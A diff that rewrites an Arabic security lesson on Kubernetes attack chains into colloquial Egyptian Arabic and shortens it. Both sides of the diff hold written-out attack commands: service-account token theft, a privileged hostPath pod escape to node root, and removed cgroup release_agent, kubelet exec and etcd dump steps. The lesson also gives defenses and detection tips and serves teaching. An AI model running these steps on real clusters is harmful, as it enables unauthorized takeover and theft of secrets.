@@ -1,64 +1,70 @@
-# سلاسل هجوم Kubernetes (Kubernetes Attack Chains)
+# اختراق كوبرنيتيس: من "الحاوية" إلى السيطرة الكاملة على الـ Cluster
 
-تعد منصات التطبيقات الحديثة بمثابة خزائن للاعتمادات ومخازن للأسرار، كما تمثل طريقاً سريعاً للوصول إلى كافة أعباء العمل الأخرى داخل العنقود (Cluster). يهدف هذا الدرس إلى رسم مسار المهاجم بدءاً من القدرة على تشغيل حاوية (Pod) وصولاً إلى السيطرة الكاملة على "مستوى التحكم" (Control Plane)، مع تسليط الضوء على نقاط الاختناق التي يجب على المدافعين تحصينها أولاً.
+المنصات الحديثة بقت هي المخزن الحقيقي لكل الـ Credentials والـ Secrets، وهي أسرع طريق للوصول لكل البيانات والخدمات داخل الـ Cluster. في الدرس ده، هنمشي مع المهاجم خطوة بخطوة: من أول ما يدخل لـ Pod بسيط، لحد ما يسيطر بالكامل على الـ Control Plane. هنعرف إيه هي الثغرات القاتلة اللي لازم المدافعين يسدوها فوراً.
 
-> [!warning] التأثير على العنقود
-> يجب تنفيذ هذه التقنيات فقط على العناقيد التي تملكها أو في بيئات المختبرات مثل KubeGoat أو Kubernetes Goat. تذكر أن أي تغيير غير صحيح في صلاحيات RBAC داخل عنقود مشترك قد يؤدي إلى تعطيل بيئة الإنتاج للجميع.
+> [!warning] تنبيه هام
+> طبق التقنيات دي فقط في بيئة معملية (Lab) زي KubeGoat أو Kubernetes Goat. أي تعديل غلط في صلاحيات الـ RBAC على Cluster حقيقي ممكن يوقف الشغل ويسبب كارثة.
 
-## نموذج التهديد (Threat Model)
+## إزاي المهاجم بيشوف الـ Cluster؟ (Threat Model)
 
 ![بيئة هجوم كوبرنيتيس](/images/lessons/kubernetes_attack_surface_en.png)
 
-توجد خمس نقاط دخول رئيسية: تسريب ملفات kubeconfig، واجهات البرمجيات (API) أو لوحات التحكم المكشوفة، أعباء العمل الضعيفة، الـ kubelet غير المؤمن، وصور الحاويات المفخخة في سلسلة التوريد.
+عندنا 5 مداخل رئيسية لأي هجوم:
+1. تسريب ملفات الـ **kubeconfig**.
+2. الـ **APIs** أو لوحات التحكم المكشوفة للإنترنت.
+3. التطبيقات الضعيفة اللي شغالة جوه الـ Cluster.
+4. الـ **kubelet** لو مش متأمن كويس.
+5. الصور (**Images**) الملغمة في مراحل الـ Supply Chain.
 
-## 1. الاستطلاع (Reconnaissance) — ما هو سطح الهجوم المكشوف؟
+## 1. الاستطلاع (Reconnaissance) — إيه اللي مكشوف بره؟
+
+أول حاجة المهاجم بيعملها هي إنه يدور على أي ثغرة في الـ API Server المكشوف:
 
 ```terminal
 # البحث عن واجهات برمجة تطبيقات Kubernetes المكشوفة
 shodan search 'product:"Kubernetes"'
 shodan search 'http.title:"Kubernetes Dashboard"'
-fofa.info 'app="kubernetes" && country="XX"'
 
-# بمجرد الحصول على عنوان IP:
+# لو لقيت عنوان IP، جرب تشوف هل مسموح بالدخول المجهول (Anonymous Auth)؟
 kubectl --insecure-skip-tls-verify --server=https://API:6443 get nodes
-# إذا كانت المصادقة المجهولة (Anonymous-Auth) مفعلة، يمكنك قراءة كافة البيانات
+
+# لو اشتغلت معاك، شوف صلاحياتك إيه بالظبط:
 kubectl --insecure-skip-tls-verify --server=https://API:6443 auth can-i --list
 ```
 
-## 2. من اختراق الحاوية إلى العنقود (Pod RCE → Cluster)
+## 2. من اختراق الـ Pod للسيطرة على الـ Cluster (Pod RCE → Cluster)
 
-عند نجاحك في اختراق حاوية (Pod) عبر ثغرة على مستوى التطبيق (مثل SSRF أو Deserialization)، تبدأ مرحلة التقصي الداخلي:
+لو المهاجم قدر يخترق تطبيق شغال جوه Pod (مثلاً عن طريق SSRF)، أول حاجة بيعملها هي إنه يلم معلومات من جوه الـ Pod نفسه:
 
 ```terminal
-# داخل الحاوية (Pod)
+# تجميع الـ Token والمعلومات الأساسية
 ls /var/run/secrets/kubernetes.io/serviceaccount/
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 APISERVER=https://kubernetes.default.svc
 NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
 
-# ما هي صلاحيات حساب الخدمة (SA) الحالي؟
+# فحص صلاحيات الـ Service Account الحالي
 curl -sk -H "Authorization: Bearer $TOKEN" \
   "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
   -X POST -H 'Content-Type: application/json' \
   -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"
 ```
 
-## 3. إساءة استخدام RBAC — مسارات تصعيد الصلاحيات
+## 3. ثغرات الـ RBAC — إزاي تصعد صلاحياتك؟
 
-بعض صلاحيات RBAC تعادل الحصول على صلاحيات الجذر (Root) في العنقود:
+الـ RBAC هو اللي بيحدد مين يعمل إيه. فيه صلاحيات لو لقيتها، فأنت تقريباً بقيت Root على الـ Cluster:
 
-| الصلاحية (Verb) | لماذا تعادل صلاحية المسؤول (Admin)؟ |
+| الصلاحية (Verb) | ليه هي خطيرة جداً؟ |
 |------------------|---------------------|
-| `create pods` (في أي Namespace) | تتيح تحميل نظام ملفات المضيف والهروب إلى النود (Node) |
-| `create pods/exec` | تتيح الدخول إلى أي حاوية موجودة وسرقة الاعتمادات |
-| `get/list secrets` | تتيح قراءة رموز (Tokens) حسابات الخدمة، بما فيها حساب المسؤول |
-| `escalate clusterroles` | تتيح منح نفسك أي صلاحيات إضافية |
-| `bind / clusterrolebinding` | تتيح ربط دور Cluster-Admin بهويتك الحالية |
-| `impersonate users/groups` | تتيح تقمص شخصية أي مستخدم بما في ذلك `system:masters` |
-| `patch nodes` | تتيح تعديل وسوم النود للتهرب من القيود أو تغيير جدولة المهام |
+| `create pods` | تقدر تشغل Pod جديد وتوصل منه لملفات الـ Host وتهرب للـ Node. |
+| `get/list secrets` | هتقرأ كل الـ Tokens، وممكن تلاقي Token بتاع Admin. |
+| `impersonate` | تقدر تتقمص شخصية أي مستخدم تاني، حتى الـ Cluster Admin. |
+| `bind` | تقدر تربط نفسك بدور (Role) عالي جداً. |
+
+**مثال: الهروب للـ Node عن طريق `create pods`**
 
 ```terminal
-# تصعيد الصلاحيات عبر 'create pods' (تحميل نظام ملفات النود)
+# تشغيل Pod بـ Privileged Mode بيوصل لملفات الـ Host
 cat <<'EOF' | kubectl apply -f -
 apiVersion: v1
 kind: Pod
@@ -74,109 +80,39 @@ spec:
     volumeMounts: [{ name: host, mountPath: /host }]
   volumes: [{ name: host, hostPath: { path: / } }]
 EOF
+
 kubectl exec -it pwn -- sh
-# أنت الآن تعمل كجذر (Root) على النود المضيف.
+# مبروك، أنت دلوقتي Root على الـ Node المضيفة.
 ```
 
-## 4. تقنيات الهروب من الحاويات (Pod Escape Primitives)
+## 4. فنون الهروب من الـ Pod (Escape Techniques)
 
-حتى في حال حظر `privileged: true` عبر السياسات الأمنية، فإن بعض أخطاء التكوين تظل كافية للهروب:
+حتى لو الـ Cluster متأمن بـ Policies تمنع الـ `privileged: true` برضه فيه طرق تانية للهروب:
 
-| خطأ التكوين | تقنية الهروب |
-|-----------|------------------|
-| `hostPID: true` | استخدام `nsenter` للوصول إلى PID 1 عند توفر `CAP_SYS_PTRACE` |
-| `hostNetwork: true` | التواصل مع الـ kubelet على `127.0.0.1:10250` أو IMDS في السحابة |
-| تحميل `hostPath: /` | الكتابة في `/etc/cron.d/` أو زرع مفتاح SSH في `/root/.ssh/` |
-| `CAP_SYS_ADMIN` | تحميل cgroup `release_agent` لتنفيذ أوامر كجذر على المضيف |
-| تحميل مقبس Docker (Socket) | استخدام `docker run --privileged` لإنشاء حاوية بصلاحيات كاملة |
-| RunAsUser 0 + غياب AppArmor | استغلال سلاسل تصعيد الصلاحيات (LPE) في النواة |
+- **hostNetwork: true**: تقدر تكلم الـ kubelet مباشرة أو الـ Cloud Metadata (IMDS).
+- **hostPath: /mount**: تقدر تكتب في ملفات الـ Cron أو تضيف مفتاح SSH بتاعك للـ Root.
+- **Docker Socket**: لو لقيت `/var/run/docker.sock` ممرر للـ Pod، تقدر تشغل أي حاوية تانية وتتحكم في الـ Host.
 
-### الهروب عبر release_agent (لا يزال فعالاً في العديد من العناقيد)
+## 5. الـ etcd: "الخزنة" اللي فيها كل حاجة
 
-```terminal
-# داخل حاوية تملك صلاحية CAP_SYS_ADMIN
-mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
-mkdir /tmp/cgrp/x
-echo 1 > /tmp/cgrp/x/notify_on_release
-HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
-echo "$HOST_PATH/cmd" > /tmp/cgrp/release_agent
-echo '#!/bin/sh' > /cmd && echo 'id > /tmp/host_id' >> /cmd && chmod +x /cmd
-sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-cat /tmp/host_id
-```
+الـ etcd هو المكان اللي بيتخزن فيه كل أسرار الـ Cluster. لو المهاجم وصل له (بورت 2379) من غير حماية، اللعبة خلصت.
 
-## 5. الـ Kubelet غير المؤمن (منفذ 10250)
+> [!danger] قاعدة ذهبية
+> الوصول للـ etcd يعني السيطرة الكاملة. لازم تعامل ملفات الـ etcd بنفس الحذر اللي بتعامل بيه الـ NTDS.dit في الـ Active Directory.
 
-إذا تم ضبط `--anonymous-auth=true` و `--authorization-mode=AlwaysAllow` في إعدادات Kubelet، فإنه سيسمح بتنفيذ الأوامر (Exec) على أي حاوية في النود التابع له:
+## 6. أولويات الدفاع (إزاي تسد الثغرات دي؟)
 
-```terminal
-curl -sk https://NODE:10250/pods | jq '.items[].metadata.name'
-# تنفيذ أمر في أي حاوية:
-curl -sk -X POST 'https://NODE:10250/run/<ns>/<pod>/<container>?cmd=id'
-```
+1. **اقفل الـ Anonymous Auth**: اتأكد إن الـ API Server والـ kubelet مش مسموح لأي حد مجهول يدخل عليهم.
+2. **استخدم Pod Security**: امنع الـ Privileged Pods والـ hostPath تماماً.
+3. **التقسيم الشبكي (Network Policies)**: امنع الـ Pods إنها تكلم بعضها إلا في أضيق الحدود (Default-Deny).
+4. **شفر الـ Secrets**: اتأكد إن الـ Secrets متشفرة وهي متخزنة (At Rest) باستخدام KMS.
+5. **راقب الـ Audit Logs**: لازم تنبه لو حد عمل `secrets/get` أو `exec` في وقت غير معتاد.
 
-## 6. استخراج بيانات etcd
+## ملخص الرصد (Detection)
 
-إذا تمكنت من الوصول إلى منفذ etcd (2379) دون الحاجة لمصادقة الشهادات (Client-cert Auth)، يمكنك قراءة **كل أسرار العنقود**، بما في ذلك ملفات kubeconfig الخاصة بالمسؤولين وجميع رموز حسابات الخدمة.
-
-```terminal
-ETCDCTL_API=3 etcdctl --endpoints=https://etcd-host:2379 \
-  --cacert=ca.crt --cert=apiserver.crt --key=apiserver.key \
-  get / --prefix --keys-only | head
-ETCDCTL_API=3 etcdctl ... get /registry/secrets/kube-system/admin-key
-```
-
-> [!danger] الوصول إلى etcd يعني السيطرة الكاملة
-> تعد النسخ الاحتياطية لـ etcd المخزنة في حاويات S3 دون تشفير من أكثر الثغرات تكراراً. يجب معاملة ملفات etcd بنفس مستوى السرية الذي تعامل به ملفات NTDS.dit في بيئات Active Directory.
-
-## 7. مخاطر سلسلة التوريد — سجلات الصور
-
-```terminal
-# البحث عن سجلات الصور (Registries) المكشوفة
-shodan search 'product:"Docker Registry" "/v2/"'
-
-# سحب صورة خاصة دون مصادقة (في حال وجود خطأ تكوين)
-curl https://registry.target/v2/_catalog
-curl https://registry.target/v2/<image>/manifests/latest -H "Accept: application/vnd.docker.distribution.manifest.v2+json"
-
-# حقن طبقة خبيثة أو استخدام تقنية Typosquatting للوسوم (Tags)
-docker tag pwn:latest registry.target/library/nginx:1.25.3-alpine
-docker push registry.target/library/nginx:1.25.3-alpine
-```
-
-## سيناريو اختراق كامل (Purple-Team Scenario)
-
-```terminal
-# 1. اكتشاف لوحة تحكم مكشوفة (قراءة مجهولة لنقطة /metrics)
-curl https://target/metrics | grep kube_pod_info | head
-
-# 2. العثور على حاوية (Pod) تشغل تطبيقاً ضعيفاً واختراقها عبر SSRF
-curl 'https://target/api?url=http://app/internal'
-
-# 3. من الداخل، تعداد صلاحيات SA؛ تبين وجود صلاحية create pods (دور default-edit)
-# 4. إنشاء حاوية ذات صلاحيات (Privileged Pod) تقوم بتحميل نظام ملفات المضيف /
-# 5. استخدام nsenter للوصول للمضيف واستخراج اعتمادات Kubelet
-# 6. استخدام اعتمادات Kubelet لتنفيذ exec على حاوية apiserver واستخراج ملف --token-auth-file
-# 7. باستخدام رمز Cluster-Admin، استخراج بيانات etcd → الحصول على كافة الأسرار واعتمادات السحابة
-# 8. التحرك الجانبي نحو السحابة (عبر IRSA / Workload Identity)
-```
-
-## أولويات الدفاع (Defender Priorities)
-
-1. **تعطيل المصادقة المجهولة** على مستوى الـ apiserver والـ kubelet عبر ضبط `--anonymous-auth=false`.
-2. **تفعيل PodSecurityAdmission بنمط `restricted`** على كافة نطاقات الأسماء (Namespaces)؛ وحظر الـ `privileged` والـ `hostPath` وغيرها.
-3. **فرض سياسات الشبكة (Network Policies)** بنمط "رفض الكل" (Default-Deny) بين نطاقات الأسماء؛ لمنع التحرك الجانبي.
-4. **تشفير الأسرار أثناء السكون (At Rest)** باستخدام مزود KMS وتدويرها بانتظام.
-5. **إدارة الصور**: التحقق من التواقيع الرقمية (Cosign / Sigstore) وحظر استخدام الوسم `latest`.
-6. **مراجعة RBAC دورياً**: البحث عن صلاحيات مثل `escalate` و `bind` و `impersonate`.
-7. **إرسال سجلات التدقيق (Audit Logs) إلى SIEM**: والتنبيه عند رصد عمليات `pods/exec` أو `secrets/get` خارج النطاق المعتاد.
-
-## أفكار للرصد والتقصي النشط
-
-| مصدر البيانات | مؤشر الاختراق (Detection) |
+| المصدر | إيه اللي تراقبه؟ |
 |-----------|-----------|
-| سجلات `pods/exec` | أي تنفيذ أوامر من قبل مستخدم بشري في بيئة الإنتاج |
-| طلبات GET مجهولة للأسرار | محاولات استطلاع نشطة |
-| إنشاء Pod مع `hostPath: /` | تنبيه حرج جداً — نشاط تخريبي مؤكد غالباً |
-| تواصل مع Kubelet 10250 من خارج مستوى التحكم | محاولة تحرك جانبي (Lateral Movement) |
-| ارتفاع زمن استجابة etcd مع قراءات ضخمة | احتمال وجود عملية استخراج بيانات (Dump) |
+| **Audit Logs** | أي استخدام لأمر `exec` في بيئة الـ Production. |
+| **API Server** | محاولات قراءة الـ Secrets من حسابات خدمة مش محتاجاها. |
+| **Node Logs** | إنشاء أي Pod بيستخدم الـ `hostPath` بمسار `/`. |
+| **Network Traffic** | أي تواصل مع بورت 2379 (etcd) من بره الـ Control Plane. |
